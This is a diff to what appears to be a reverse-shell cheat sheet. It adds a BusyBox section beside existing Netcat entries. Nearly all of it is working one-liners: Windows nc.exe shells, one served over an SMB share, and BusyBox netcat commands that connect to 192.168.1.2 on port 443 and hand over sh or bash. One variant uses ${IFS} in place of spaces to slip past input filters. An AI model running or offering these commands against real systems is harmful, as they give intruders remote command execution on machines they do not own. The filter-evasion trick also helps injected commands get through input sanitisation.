@@ -6,6 +6,7 @@
 - [<kbd>Netcat</kbd>](#netcat)
   * [<kbd>Netcat Linux</kbd>](#netcat-linux)
   * [<kbd>Netcat Windows</kbd>](#netcat-windows)
+- [<kbd>BusyBox</kbd>](#busybox)
 - [<kbd>cURL</kbd>](#curl)
 - [<kbd>Wget</kbd>](#wget)
 - [<kbd>Node-RED</kbd>](#node-red)
@@ -196,6 +197,21 @@ nc.exe -e cmd 192.168.1.2 443
 #smbserver
 cp $(locate nc.exe) . && impacket-smbserver a $(pwd) -smb2support
 \\192.168.1.2\a\nc.exe -e cmd 192.168.1.2 443
+```
+
+---
+
+# <kbd>BusyBox</kbd>
+
+```sh
+#sh
+busybox nc 192.168.1.2 443 -e sh
+busybox nc 192.168.1.2 443 -e /bin/sh
+#bash
+busybox nc 192.168.1.2 443 -e bash
+busybox nc 192.168.1.2 443 -e /bin/bash
+#not space
+busybox${IFS}nc${IFS}192.168.1.2${IFS}443${IFS}-e${IFS}sh
 ```
 
 ---
